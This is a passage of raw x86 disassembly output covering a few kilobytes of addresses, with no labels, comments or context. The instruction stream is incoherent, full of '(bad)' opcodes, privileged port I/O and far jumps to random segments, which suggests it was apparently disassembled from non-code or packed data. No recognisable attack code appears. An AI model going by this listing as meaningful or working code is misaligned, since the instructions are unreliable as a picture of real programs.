  4202fd:	mov    dl,0x44
  4202ff:	scas   al,BYTE PTR es:[edi]
  420300:	sub    BYTE PTR [ebx+eax*1-0x3b1f978c],0x39
  420308:	adc    al,0x19
  42030a:	xchg   edi,eax
  42030b:	js     0x4202fd
  42030d:	into   
  42030e:	das    
  42030f:	adc    esi,DWORD PTR [esi]
  420311:	(bad)  
  420313:	data16 xor al,0xb4
  420316:	or     al,ch
  420318:	cmp    eax,0xa3731970
  42031d:	out    dx,al
  42031e:	inc    esp
  42031f:	push   ecx
  420320:	jbe    0x4202b3
  420322:	or     DWORD PTR [ecx-0x33],edi
  420325:	dec    ecx
  420326:	pop    es
  420327:	dec    esp
  420328:	rol    BYTE PTR [esi],0xb5
  42032b:	add    esp,DWORD PTR [esp+edi*8+0x5cd9a4a7]
  420332:	nop
  420333:	inc    edx
  420334:	sub    al,BYTE PTR [esi+0x7e]
  420337:	sbb    al,dl
  420339:	mov    ah,0x6
  42033b:	xor    al,0xcb
  42033d:	mov    edi,edi
  42033f:	xlat   BYTE PTR ds:[ebx]
  420340:	push   esp
  420341:	mov    esp,0x73d71c7c
  420346:	xchg   esi,eax
  420347:	iret   
  420348:	retf   
  420349:	cmp    DWORD PTR [ebp+0x78],edi
  42034c:	and    eax,0x9a6a0d3
  420351:	push   esi
  420352:	mov    al,0xab
  420354:	push   cs
  420355:	mov    ebx,0xc23b6aec
  42035a:	pushf  
  42035b:	mov    DWORD PTR [ecx],edi
  42035d:	or     al,0xaf
  42035f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420360:	retf   
  420361:	out    dx,al
  420362:	sub    eax,0xd158e8a3
  420367:	sbb    bh,bh
  420369:	popa   
  42036a:	addr16 (bad) 
  42036c:	sub    dl,bh
  42036e:	das    
  42036f:	cli    
  420370:	loopne 0x4203ec
  420372:	mov    eax,0xc14ce2a7
  420377:	ins    BYTE PTR es:[edi],dx
  420378:	fist   DWORD PTR [ebx+0x74]
  42037b:	xchg   ebp,eax
  42037c:	lds    ebx,FWORD PTR [ebp+0x12a2b0b4]
  420382:	mov    edi,0x68bfad5a
  420387:	frstor [eax]
  420389:	and    eax,0x5ca776f
  42038e:	dec    esp
  42038f:	add    eax,0x13d9027c
  420394:	jp     0x420321
  420396:	retf   
  420397:	mov    esi,0x202584d6
  42039c:	or     eax,0x80b225d9
  4203a1:	and    cl,BYTE PTR [ebx]
  4203a3:	loope  0x420409
  4203a5:	in     eax,0x80
  4203a7:	dec    edx
  4203a8:	lock jne 0x4203f8
  4203ab:	(bad)  
  4203ac:	push   eax
  4203ad:	inc    edi
  4203ae:	push   edx
  4203af:	cmp    DWORD PTR [esi-0x24],ebp
  4203b2:	inc    DWORD PTR [ecx+edi*2]
  4203b5:	xchg   BYTE PTR [ecx-0x23e9a623],bh
  4203bb:	stos   BYTE PTR es:[edi],al
  4203bc:	test   al,0x21
  4203be:	pop    es
  4203bf:	stos   DWORD PTR es:[edi],eax
  4203c0:	out    dx,eax
  4203c1:	jl     0x42042d
  4203c3:	ss int 0xa1
  4203c6:	ss jns 0x4203ba
  4203c9:	push   DWORD PTR [esi-0x3]
  4203cc:	into   
  4203cd:	or     BYTE PTR [ecx],0x31
  4203d0:	dec    edx
  4203d1:	enter  0x552b,0x3b
  4203d5:	push   edx
  4203d6:	repz jae 0x4203ba
  4203d9:	js     0x42036c
  4203db:	or     ebx,DWORD PTR [edx]
  4203dd:	xor    BYTE PTR [ebx+0x6b],dl
  4203e0:	push   ebp
  4203e1:	aam    0x50
  4203e3:	loopne 0x4203e2
  4203e5:	xor    bl,ah
  4203e7:	dec    edi
  4203e8:	push   edx
  4203e9:	xor    DWORD PTR [edi+0x7b],edi
  4203ec:	daa    
  4203ed:	mov    esp,0x4004ef9c
  4203f2:	or     BYTE PTR [edi+eiz*4],0xce
  4203f6:	out    0xb0,al
  4203f8:	and    esi,0xffffffd3
  4203fb:	jbe    0x4203f3
  4203fd:	dec    eax
  4203fe:	mov    ds:0x962e7cb8,eax
  420403:	dec    edx
  420404:	loop   0x4203c3
  420406:	in     eax,dx
  420407:	je     0x4203cc
  420409:	ins    DWORD PTR es:[edi],dx
  42040a:	cmc    
  42040b:	sbb    eax,0x808045f3
  420410:	daa    
  420411:	int    0x26
  420413:	lock mov ds:0x774c4c84,eax
  420419:	xchg   edi,eax
  42041a:	pop    es
  42041b:	pop    es
  42041c:	xor    BYTE PTR [esi+0x27],cl
  42041f:	jns    0x420423
  420421:	mov    ebx,0x75f5ed99
  420426:	push   0xb6476e10
  42042b:	imul   ebp,DWORD PTR [ebp+0x2f],0x9c2b8661
  420432:	pop    ebp
  420433:	test   eax,0xcc0bcb04
  420438:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42043a:	fadd   DWORD PTR [edx-0x4d]
  42043d:	adc    edx,DWORD PTR [ebx]
  42043f:	rcl    DWORD PTR [edx+0x4855d87d],cl
  420445:	mov    bl,0xa4
  420447:	fnstsw WORD PTR [ecx]
  420449:	jl     0x420480
  42044b:	add    DWORD PTR [eax+0x73090bfd],edx
  420451:	mov    fs,WORD PTR [eax+0x52]
  420454:	mov    esi,0xdf3bf458
  420459:	ror    DWORD PTR [ebx+0x5378bb0d],cl
  42045f:	add    BYTE PTR [ebp-0x7089a835],ah
  420465:	call   FWORD PTR [esp+eax*1]
  420468:	aad    0x92
  42046a:	jb     0x420424
  42046c:	call   0xad6f:0x49f27f28
  420473:	call   0xc66f:0xd893a85f
  42047a:	mov    eax,DWORD PTR [ecx-0x2fe735e4]
  420480:	sbb    BYTE PTR [edx],al
  420482:	inc    eax
  420483:	lahf   
  420484:	(bad)  
  420485:	aas    
  420486:	push   esp
  420487:	inc    ecx
  420488:	add    ebp,0xffffffd8
  42048b:	int3   
  42048c:	sub    al,0x25
  42048e:	or     DWORD PTR [esi+0x191184f6],esp
  420494:	xchg   ebx,eax
  420495:	fs out 0x96,al
  420498:	test   BYTE PTR [ebp-0x4357a6f7],bh
  42049e:	mov    bh,0xaa
  4204a0:	xchg   BYTE PTR [edx-0x3775ead8],cl
  4204a6:	iret   
  4204a7:	xchg   DWORD PTR [esi],esp
  4204a9:	or     al,BYTE PTR [edx+0x47]
  4204ac:	mov    bh,0xc9
  4204ae:	sub    ch,BYTE PTR [edi]
  4204b0:	daa    
  4204b1:	pop    ds
  4204b2:	aam    0x2f
  4204b4:	sbb    dh,BYTE PTR [esi+eax*8-0x6e]
  4204b8:	popa   
  4204b9:	mov    ecx,0xd6837c3e
  4204be:	aad    0x34
  4204c0:	test   eax,0x7ebbff92
  4204c5:	sbb    eax,0x45b2e356
  4204ca:	xor    al,0x1e
  4204cc:	std    
  4204cd:	mov    bh,0x42
  4204cf:	jbe    0x420547
  4204d1:	mov    dh,cl
  4204d3:	mov    WORD PTR [esi+edi*1],es
  4204d6:	inc    edx
  4204d7:	mov    ah,BYTE PTR [ecx]
  4204d9:	lods   al,BYTE PTR ds:[esi]
  4204da:	xor    al,0xa6
  4204dc:	fwait
  4204dd:	shr    DWORD PTR [edx-0x7a1f0ccd],cl
  4204e3:	adc    eax,0x9f990331
  4204e8:	add    dh,BYTE PTR ds:0xff884d
  4204ee:	push   edi
  4204ef:	lock push ebx
  4204f1:	outs   dx,DWORD PTR ds:[esi]
  4204f2:	jmp    0x7e20:0xf7f15b72
  4204f9:	pop    edi
  4204fa:	fldenv [edx]
  4204fc:	push   esi
  4204fd:	sahf   
  4204fe:	sti    
  4204ff:	lock mov cl,0xcc
  420502:	pop    edx
  420503:	scas   al,BYTE PTR es:[edi]
  420504:	cdq    
  420505:	inc    esp
  420506:	sub    al,0x6d
  420508:	or     al,BYTE PTR [edx+0x69]
  42050b:	pop    ebx
  42050c:	ret    0x4947
  42050f:	fidivr WORD PTR [edi+0x7d]
  420512:	xlat   BYTE PTR ds:[ebx]
  420513:	dec    ebx
  420514:	xchg   ebp,eax
  420515:	sub    al,0xa6
  420517:	push   ds
  420518:	pop    es
  420519:	loopne 0x4204e0
  42051b:	xor    BYTE PTR fs:[edx],al
  42051e:	xor    al,0x98
  420520:	rol    DWORD PTR [edi*2+0x596ba76c],0x8c
  420528:	push   esi
  420529:	(bad)  
  42052a:	jmp    0x55432576
  42052f:	pop    eax
  420530:	jnp    0x42054c
  420532:	call   0x1baa:0x8fe946a8
  420539:	push   0xffffffac
  42053b:	das    
  42053c:	test   DWORD PTR [ebp-0x3cc241d9],esi
  420542:	je     0x4204ff
  420544:	push   ebx
  420545:	fstp   QWORD PTR [esi-0x24]
  420548:	(bad)  
  420549:	out    0xb5,eax
  42054b:	arpl   WORD PTR [edx+0xe],ax
  42054e:	ins    DWORD PTR es:[edi],dx
  42054f:	dec    edi
  420550:	ror    DWORD PTR [esi-0x75],1
  420553:	leave  
  420554:	out    0x1a,al
  420556:	xor    DWORD PTR ds:0xb3d4bf88,eax
  42055c:	sbb    al,0x9d
  42055e:	hlt    
  42055f:	or     edi,ecx
  420561:	pop    edx
  420562:	inc    ebx
  420563:	lods   al,BYTE PTR ds:[esi]
  420564:	jno    0x420529
  420566:	mov    ebx,DWORD PTR [ebx+0x37]
  420569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42056a:	test   eax,0xc047428
  42056f:	cmp    ebp,edx
  420571:	xchg   BYTE PTR [edx-0x1f],dh
  420574:	adc    DWORD PTR [eax],0xffffffba
  420577:	inc    esi
  420578:	mov    ch,0xce
  42057a:	popf   
  42057b:	jl     0x420592
  42057d:	pop    edx
  42057e:	jle    0x420573
  420580:	sbb    BYTE PTR [edx+0x4c],dl
  420583:	stc    
  420584:	mov    eax,ds:0x44cefed3
  420589:	shr    BYTE PTR [ecx],cl
  42058b:	adc    dl,BYTE PTR [eax+ebp*4+0x1b]
  42058f:	call   0xde4c:0x710558cc
  420596:	push   ebx
  420597:	adc    al,BYTE PTR [ebp+0x2eecf44]
  42059d:	out    0xea,eax
  42059f:	xchg   ebx,eax
  4205a0:	inc    ecx
  4205a1:	out    dx,eax
  4205a2:	fmul   QWORD PTR [ecx+0x2e]
  4205a5:	jle    0x4205f4
  4205a7:	stc    
  4205a8:	mov    gs,WORD PTR [ebx+0x7788c4b7]
  4205ae:	cld    
  4205af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205b0:	cs fs aas 
  4205b3:	neg    esp
  4205b5:	jecxz  0x42060a
  4205b7:	jmp    0x2bb6:0x440a5e48
  4205be:	add    ah,BYTE PTR [eax+0x6000b2f7]
  4205c4:	sahf   
  4205c5:	mov    WORD PTR [ebp+eiz*8+0x54],gs
  4205c9:	mov    al,0x56
  4205cb:	leave  
  4205cc:	or     BYTE PTR [ebx+0x50],bh
  4205cf:	pusha  
  4205d0:	repz sub eax,DWORD PTR [esi-0x2df4360a]
  4205d7:	jg     0x42064d
  4205d9:	dec    edx
  4205da:	xchg   esi,eax
  4205db:	stc    
  4205dc:	rol    cl,1
  4205de:	js     0x420622
  4205e0:	adc    eax,0xb2190d04
  4205e5:	jae    0x42060f
  4205e7:	mov    ah,0x19
  4205e9:	bound  ebx,QWORD PTR [ecx-0x2f]
  4205ec:	and    eax,0xfe5d27b5
  4205f1:	enter  0xfda7,0xa5
  4205f5:	cmp    ah,0xb
  4205f8:	dec    ebx
  4205f9:	pusha  
  4205fa:	cmp    DWORD PTR [eax-0x3e],esi
  4205fd:	push   ecx
  4205fe:	lahf   
  4205ff:	jp     0x4205a6
  420601:	mov    ch,0x4b
  420603:	xor    edx,DWORD PTR [edx-0xb]
  420606:	lahf   
  420607:	das    
  420608:	and    BYTE PTR [eax+0x4801cfaf],0x4d
  42060f:	sbb    BYTE PTR [ecx],dl
  420611:	inc    ecx
  420612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420613:	ror    BYTE PTR [ebp-0x47],0x36
  420617:	push   esp
  420618:	xor    dh,BYTE PTR [edi]
  42061a:	test   al,0x36
  42061c:	cdq    
  42061d:	xchg   DWORD PTR [edx-0x4339609d],ebx
  420623:	jge    0x42064e
  420625:	dec    ecx
  420626:	dec    edi
  420627:	lods   al,BYTE PTR ds:[esi]
  420628:	stos   BYTE PTR es:[edi],al
  420629:	push   ecx
  42062a:	inc    ebp
  42062b:	xchg   ebx,eax
  42062c:	lods   al,BYTE PTR ds:[esi]
  42062d:	mov    bh,0x1d
  42062f:	retf   
  420630:	push   esp
  420631:	lea    eax,ds:0x1be97433
  420637:	cmp    ecx,ebx
  420639:	sbb    dl,BYTE PTR [ecx-0x6dcf05b5]
  42063f:	clc    
  420640:	pop    ss
  420641:	add    ebp,edx
  420643:	pushf  
  420644:	xchg   ebx,eax
  420645:	fwait
  420646:	out    dx,eax
  420647:	ss in  al,0x78
  42064a:	pop    edx
  42064b:	pop    edx
  42064c:	push   es
  42064d:	add    eax,0x788a8fdf
  420652:	pop    eax
  420653:	pop    edi
  420654:	retf   
  420655:	clc    
  420656:	jnp    0x4205e5
  420658:	mov    DWORD PTR [edx+ecx*8-0xd68a44c],edi
  42065f:	add    esi,edi
  420661:	mov    al,ds:0x83dd744c
  420666:	aad    0x9
  420668:	sbb    al,0x1f
  42066a:	mov    ds:0xb813401b,al
  42066f:	call   0x332a:0x5cb17de8
  420676:	push   es
  420677:	mov    BYTE PTR [esi+edi*8],al
  42067a:	fadd   DWORD PTR [edi+edi*8]
  42067d:	sbb    al,0x52
  42067f:	xchg   esp,eax
  420680:	mov    ebp,0xe24313a4
  420685:	push   edx
  420686:	repnz push ebp
  420688:	fs mov ch,0x16
  42068b:	xchg   edi,ecx
  42068d:	pop    ss
  42068e:	sbb    al,0x3a
  420690:	out    dx,eax
  420691:	stos   BYTE PTR es:[edi],al
  420692:	and    DWORD PTR [ecx],ebx
  420694:	ror    BYTE PTR [edi-0x18e667cd],cl
  42069a:	inc    edi
  42069b:	ret    
  42069c:	add    eax,0xc26d18b4
  4206a1:	push   esp
  4206a2:	in     eax,dx
  4206a3:	sub    al,0x9d
  4206a5:	mov    ds:0x6c503df8,eax
  4206aa:	mov    edi,0x85287151
  4206af:	push   ebx
  4206b0:	rcl    DWORD PTR [eax+ebp*1+0x53],1
  4206b4:	and    al,0xb0
  4206b6:	fwait
  4206b7:	xor    cl,BYTE PTR [ebx]
  4206b9:	mov    esi,0x36de8149
  4206be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206bf:	pop    esp
  4206c0:	call   DWORD PTR [edi]
  4206c2:	sub    dh,BYTE PTR [eax+esi*1+0x368ed959]
  4206c9:	icebp  
  4206ca:	cmp    DWORD PTR [esi-0x6f],eax
  4206cd:	cwde   
  4206ce:	test   BYTE PTR [edi+0x12],dh
  4206d1:	daa    
  4206d2:	xor    esp,DWORD PTR ds:0xaedfe66c
  4206d8:	sahf   
  4206d9:	in     al,dx
  4206da:	dec    edi
  4206db:	cs inc ebp
  4206dd:	push   0xa5bf4a8d
  4206e2:	ss out 0xf4,eax
  4206e5:	or     edx,DWORD PTR ds:0x4eb4c22c
  4206eb:	cmp    eax,0xef10f7f8
  4206f0:	dec    ecx
  4206f1:	or     al,0x44
  4206f3:	pop    eax
  4206f4:	jle    0x42071b
  4206f6:	popa   
  4206f7:	cwde   
  4206f8:	repz xchg ebp,eax
  4206fa:	push   esi
  4206fb:	mov    dl,0xcc
  4206fd:	jne    0x42071d
  4206ff:	popf   
  420700:	mov    dl,BYTE PTR [eax-0xa851ed0]
  420706:	daa    
  420707:	sbb    eax,0xae5edf0c
  42070c:	sbb    BYTE PTR [ecx-0x65],bh
  42070f:	mov    al,ds:0x7ca1512f
  420714:	retf   0x50b6
  420717:	sbb    eax,0x179a30f
  42071c:	jmp    0xd65266f8
  420721:	(bad)  
  420722:	mov    bl,0xd6
  420724:	and    eax,0x221d1fe5
  420729:	retf   0xfb7b
  42072c:	out    dx,eax
  42072d:	dec    edx
  42072e:	div    BYTE PTR [ebp-0x61]
  420731:	popa   
  420732:	test   DWORD PTR [ecx],eax
  420734:	in     eax,dx
  420735:	int3   
  420736:	test   DWORD PTR [ecx+eiz*4+0x6fa234e6],0x2731d6ac
  420741:	sub    eax,0x20c07ac7
  420746:	cmp    edi,DWORD PTR [ecx+eiz*1]
  420749:	icebp  
  42074a:	xor    eax,0xf014e5c8
  42074f:	or     BYTE PTR [eax+0x2e7c3195],0x19
  420756:	shl    BYTE PTR [ecx],1
  420758:	daa    
  420759:	and    al,0x91
  42075b:	xchg   esp,eax
  42075c:	mov    bh,0x1d
  42075e:	test   BYTE PTR [esp+ebp*2],bl
  420761:	in     eax,dx
  420762:	ja     0x420773
  420764:	adc    al,0x92
  420766:	mov    edx,0x799c6262
  42076b:	(bad)  
  42076c:	cmc    
  42076d:	and    al,0x85
  42076f:	aad    0x60
  420771:	pop    esi
  420772:	add    dh,BYTE PTR [edx]
  420774:	and    al,al
  420776:	dec    edx
  420777:	jbe    0x420770
  420779:	mov    dl,0x17
  42077b:	xor    eax,0xe78c3896
  420780:	sbb    ch,BYTE PTR ds:0x51e729cb
  420786:	pop    ebx
  420787:	adc    eax,DWORD PTR [edi+0x51]
  42078a:	je     0x420769
  42078c:	inc    edi
  42078d:	mov    ebp,0xd0b6d957
  420792:	lods   eax,DWORD PTR ds:[esi]
  420793:	call   0x63894e4e
  420798:	arpl   WORD PTR [edx-0x5f],si
  42079b:	cwde   
  42079c:	iret   
  42079d:	ds out dx,al
  42079f:	shr    BYTE PTR [edx],cl
  4207a1:	xlat   BYTE PTR ds:[ebx]
  4207a2:	push   0x51
  4207a4:	cdq    
  4207a5:	cmp    DWORD PTR [ebx+0x745af940],esp
  4207ab:	push   esi
  4207ac:	mov    eax,ds:0xdc082afd
  4207b1:	dec    ebp
  4207b2:	into   
  4207b3:	imul   ebx,ebx,0x50
  4207b6:	pop    ss
  4207b7:	popa   
  4207b8:	cmp    eax,0x3d31b520
  4207bd:	gs es in al,0x2c
  4207c1:	sahf   
  4207c2:	fsubp  st(2),st
  4207c4:	and    esp,0x68
  4207c7:	pop    ecx
  4207c8:	adc    esi,eax
  4207ca:	jbe    0x4207d7
  4207cc:	cmp    al,cl
  4207ce:	mov    dl,0x8d
  4207d0:	sar    DWORD PTR [ebx-0x4a31eb5e],cl
  4207d6:	push   ds
  4207d7:	xchg   esi,ebx
  4207d9:	std    
  4207da:	pop    es
  4207db:	aam    0xf5
  4207dd:	xor    DWORD PTR [ecx],ebx
  4207df:	add    BYTE PTR ds:0x2ec208f2,bl
  4207e5:	cdq    
  4207e6:	hlt    
  4207e7:	xor    al,0xc0
  4207e9:	xchg   ebx,eax
  4207ea:	fs ret 0x2a1f
  4207ee:	mov    ds:0xa9371dbc,al
  4207f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207f4:	es xor edi,edx
  4207f7:	out    0x91,eax
  4207f9:	lods   al,BYTE PTR ds:[esi]
  4207fa:	pop    ds
  4207fb:	dec    ebx
  4207fc:	xchg   edi,eax
  4207fd:	sbb    eax,eax
  4207ff:	or     ebx,DWORD PTR [ebx+edx*4+0x22]
  420803:	add    DWORD PTR [edi+0x5d],edx
  420806:	mov    edi,0x91d30188
  42080b:	or     bl,0x69
  42080e:	inc    edx
  42080f:	or     ebp,DWORD PTR [edi+0x37cbc3db]
  420815:	out    dx,al
  420816:	repz sahf 
  420818:	add    ch,BYTE PTR [ebp+0x59]
  42081b:	inc    esp
  42081c:	add    dh,BYTE PTR ds:0x2422cfe3
  420822:	jl     0x420803
  420824:	pop    ds
  420825:	pop    ebp
  420826:	ror    DWORD PTR [eax-0x32],0xfd
  42082a:	or     ah,al
  42082c:	int3   
  42082d:	call   0x7a79:0x40898cfd
  420834:	pop    ebp
  420835:	pop    ds
  420836:	mov    al,0x5e
  420838:	jne    0x420827
  42083a:	jmp    0x5808:0xc1f18bbe
  420841:	add    BYTE PTR [esi-0x1132deec],al
  420847:	iret   
  420848:	dec    esi
  420849:	repz jo 0x42089c
  42084c:	xchg   esi,eax
  42084d:	es pop es
  42084f:	arpl   WORD PTR [ebx-0x48],bx
  420852:	dec    esi
  420853:	pusha  
  420854:	mov    BYTE PTR [ebp+0xe97db49],0xdd
  42085b:	mov    ds:0x90c89fa7,al
  420860:	pop    ds
  420861:	xchg   esp,eax
  420862:	jbe    0x420873
  420864:	js     0x420849
  420866:	sahf   
  420867:	xlat   BYTE PTR ds:[ebx]
  420868:	loop   0x42089e
  42086a:	pop    ecx
  42086b:	dec    ecx
  42086c:	sub    al,BYTE PTR [edx-0x40]
  42086f:	outs   dx,BYTE PTR ds:[esi]
  420870:	pop    eax
  420871:	(bad)  
  420872:	lds    eax,FWORD PTR [esi+0x7faf1c17]
  420878:	inc    ebx
  420879:	imul   ebx,DWORD PTR [edi-0x36fc88c7],0x52
  420880:	out    0x5f,eax
  420882:	sbb    eax,DWORD PTR [edi+ebx*2+0x1040cca]
  420889:	push   ss
  42088a:	jecxz  0x420853
  42088c:	pop    ecx
  42088d:	clc    
  42088e:	pop    ebp
  42088f:	mov    dl,0xbd
  420891:	xor    BYTE PTR [ebp-0x52b3c165],ch
  420897:	adc    ecx,ebx
  420899:	sub    al,0xc4
  42089b:	adc    dh,dh
  42089d:	fisttp WORD PTR [ecx]
  42089f:	push   ebp
  4208a0:	rcl    esp,cl
  4208a2:	repnz sbb ah,BYTE PTR [edi+esi*4]
  4208a6:	mov    ah,0xd4
  4208a8:	dec    eax
  4208a9:	mov    dl,0xae
  4208ab:	leave  
  4208ac:	xlat   BYTE PTR ds:[ebx]
  4208ad:	outs   dx,DWORD PTR ds:[esi]
  4208ae:	rcr    BYTE PTR [si+0x60],0x92
  4208b3:	das    
  4208b4:	(bad)  
  4208b6:	inc    ebp
  4208b7:	leave  
  4208b8:	adc    BYTE PTR [ecx+ebx*1],bh
  4208bb:	push   ebp
  4208bc:	ja     0x420864
  4208be:	aad    0x69
  4208c0:	lds    edx,FWORD PTR [edi-0x56]
  4208c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208c5:	in     al,0x39
  4208c7:	or     al,0xba
  4208c9:	out    0xd6,eax
  4208cb:	mov    ds:0x519ad002,al
  4208d0:	mov    bh,0x24
  4208d2:	jo     0x42086c
  4208d4:	pop    ecx
  4208d5:	add    al,0xd
  4208d7:	std    
  4208d8:	sahf   
  4208d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208da:	dec    ecx
  4208db:	and    al,0xe1
  4208dd:	jbe    0x420908
  4208df:	repnz mov esi,0xf1b78de7
  4208e5:	enter  0x924b,0x25
  4208e9:	pop    eax
  4208ea:	inc    edx
  4208eb:	lods   al,BYTE PTR ds:[esi]
  4208ec:	call   0x3a5b:0x70f0b814
  4208f3:	(bad)  
  4208f4:	ins    DWORD PTR es:[edi],dx
  4208f5:	mov    bl,0x10
  4208f7:	mov    ecx,0x314d1879
  4208fc:	push   0x13
  4208fe:	mov    eax,0xc04b12f4
  420903:	ja     0x42090c
  420905:	scas   al,BYTE PTR es:[edi]
  420906:	add    al,BYTE PTR [edi-0x2f60c1a1]
  42090c:	ins    DWORD PTR es:[edi],dx
  42090d:	mov    bl,0x19
  42090f:	ret    
  420910:	push   ebx
  420911:	int3   
  420912:	sub    bl,BYTE PTR ds:0xd4508666
  420918:	scas   eax,DWORD PTR es:[edi]
  420919:	mov    dh,0xdb
  42091b:	mov    dh,0xbe
  42091d:	lock xor al,0xdd
  420920:	adc    dh,BYTE PTR [ebx-0x24214104]
  420926:	pop    eax
  420927:	jl     0x4208d2
  420929:	scas   eax,DWORD PTR es:[edi]
  42092a:	xchg   esp,eax
  42092b:	cs loop 0x4208f6
  42092e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42092f:	xor    DWORD PTR [edi-0x43],eax
  420932:	cmp    DWORD PTR [ecx],esp
  420934:	test   BYTE PTR [eax-0x7e05a949],cl
  42093a:	or     edx,eax
  42093c:	into   
  42093d:	xor    eax,0xb286d2d7
  420942:	fsub   QWORD PTR [ecx+0x4b]
  420945:	add    cl,dh
  420947:	jae    0x420933
  420949:	ret    0x7f17
  42094c:	mov    dl,0x43
  42094e:	(bad)  
  42094f:	nop
  420950:	int3   
  420951:	inc    edi
  420952:	sbb    BYTE PTR [ebx-0x7],ch
  420955:	push   edi
  420956:	mov    ecx,0x1ae8d769
  42095b:	fist   WORD PTR [edi]
  42095d:	push   edx
  42095e:	xchg   esi,eax
  42095f:	mov    ds:0x321241ef,eax
  420964:	push   ebp
  420965:	pop    ecx
  420966:	nop
  420967:	jl     0x42099d
  420969:	pop    esp
  42096a:	sub    edi,DWORD PTR [edi+edx*1-0x38]
  42096e:	cmovl  ebp,DWORD PTR [ecx+0x49a15dce]
  420975:	cmp    edi,DWORD PTR [edi-0x8]
  420978:	sbb    al,0x90
  42097a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42097b:	div    DWORD PTR [edi]
  42097d:	(bad)  
  42097e:	sbb    eax,0xdea28b2e
  420983:	xor    BYTE PTR [ebx],ch
  420985:	inc    eax
  420986:	fnstsw WORD PTR [ecx+0x39059dae]
  42098c:	inc    ebp
  42098d:	(bad)  
  42098e:	fs iret 
  420990:	aas    
  420991:	js     0x4209b0
  420993:	inc    esi
  420994:	repnz rcr ah,1
  420997:	sub    esp,DWORD PTR [edx]
  420999:	or     bh,BYTE PTR [ebp+edi*8-0x4eb4cbda]
  4209a0:	xchg   ecx,eax
  4209a1:	inc    esi
  4209a2:	in     al,dx
  4209a3:	popf   
  4209a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209a5:	ror    BYTE PTR [ebp-0x66],1
  4209a8:	sub    eax,0x1c568c00
  4209ad:	push   edx
  4209ae:	xchg   ecx,eax
  4209af:	lds    eax,FWORD PTR [eax+esi*8]
  4209b2:	mov    ebp,0x27a5fa0a
  4209b7:	cmc    
  4209b8:	shl    dl,1
  4209ba:	adc    ebp,DWORD PTR [ecx-0x6f]
  4209bd:	inc    edx
  4209be:	jp     0x42099e
  4209c0:	add    al,0x43
  4209c2:	ficomp DWORD PTR [ebx-0x13]
  4209c5:	imul   edx,DWORD PTR [esi+0xa154cb7],0xffffffb8
  4209cc:	cli    
  4209cd:	(bad)  
  4209ce:	stos   BYTE PTR es:[edi],al
  4209cf:	xchg   edi,eax
  4209d0:	inc    edi
  4209d1:	scas   al,BYTE PTR es:[edi]
  4209d2:	and    cl,BYTE PTR [ecx+ebp*2+0x66]
  4209d6:	aas    
  4209d7:	dec    esi
  4209d8:	xchg   edi,eax
  4209d9:	push   ebx
  4209da:	cli    
  4209db:	sar    eax,1
  4209dd:	clc    
  4209de:	inc    ebp
  4209df:	mov    cl,0xe5
  4209e1:	ret    
  4209e2:	int3   
  4209e3:	xor    DWORD PTR [edi+0x4704621],eax
  4209e9:	dec    esp
  4209ea:	popf   
  4209eb:	pop    edi
  4209ec:	scas   al,BYTE PTR es:[edi]
  4209ed:	xchg   ebx,eax
  4209ee:	repz push cs
  4209f0:	xchg   esp,eax
  4209f1:	push   edx
  4209f2:	inc    edi
  4209f3:	push   0xb3ce4b6
  4209f8:	clc    
  4209f9:	add    DWORD PTR [ebx-0x71],ecx
  4209fc:	neg    DWORD PTR [ebx+esi*4]
  4209ff:	outs   dx,BYTE PTR ds:[esi]
  420a00:	push   esp
  420a01:	imul   esp,DWORD PTR ds:0xc94b7e29,0x22df8c09
  420a0b:	mov    dl,0x96
  420a0d:	out    0x3a,eax
  420a0f:	dec    eax
  420a10:	mov    BYTE PTR [ecx+edi*4-0x4bd2592b],dl
  420a17:	shr    ch,0x9a
  420a1a:	pop    ebx
  420a1b:	in     al,0x59
  420a1d:	cmp    eax,0xeb9ce21
  420a22:	cli    
  420a23:	repnz mov al,0xe1
  420a26:	loop   0x420a37
  420a28:	pop    edx
  420a29:	sbb    ecx,ebx
  420a2b:	mov    cl,bh
  420a2d:	sbb    dl,BYTE PTR [ecx-0x6f9e58e8]
  420a33:	and    edi,edi
  420a35:	push   edi
  420a36:	lea    edi,[ebx+0x460d344c]
  420a3c:	pop    esi
  420a3d:	sbb    eax,esp
  420a3f:	sub    BYTE PTR ds:0x755ab224,al
  420a45:	xor    edi,DWORD PTR [edi-0x4]
  420a48:	(bad)  
  420a49:	mov    dl,0x87
  420a4b:	in     al,0x61
  420a4d:	sbb    DWORD PTR [ebp+ebp*2+0x9],esi
  420a51:	xchg   edi,eax
  420a52:	add    eax,DWORD PTR [eax-0x6c]
  420a55:	call   0x1deea864
  420a5a:	(bad)  
  420a5b:	int3   
  420a5c:	das    
  420a5d:	xor    DWORD PTR [ecx+0x598a55ba],eax
  420a63:	inc    edx
  420a64:	pop    edx
  420a65:	fimul  DWORD PTR [edi+0x1e385e5b]
  420a6b:	setle  BYTE PTR [ebx-0x68f71632]
  420a72:	jno    0x420ac6
  420a74:	repz arpl WORD PTR [edx-0x2182c8de],bp
  420a7b:	shl    ah,cl
  420a7d:	mov    esp,0x5616804d
  420a82:	sbb    dl,BYTE PTR ds:0x1c59381b
  420a88:	outs   dx,DWORD PTR ds:[esi]
  420a89:	imul   ecx,DWORD PTR [ecx-0x7a],0xffffffde
  420a8d:	mov    esi,DWORD PTR [esi-0x7aac5de5]
  420a93:	loope  0x420b10
  420a95:	je     0x420a76
  420a97:	sbb    BYTE PTR [edx+esi*4],dl
  420a9a:	fld    TBYTE PTR [ecx+0x3ac927fc]
  420aa0:	cmp    eax,0x121c9c85
  420aa5:	or     al,0x85
  420aa7:	leave  
  420aa8:	and    DWORD PTR [ebx+0xf92f110],0xffffff9e
  420aaf:	inc    ebp
  420ab0:	sbb    eax,esi
  420ab2:	or     DWORD PTR [ecx],edx
  420ab4:	ret    0xee5
  420ab7:	or     esi,DWORD PTR [ebp-0x60973563]
  420abd:	pusha  
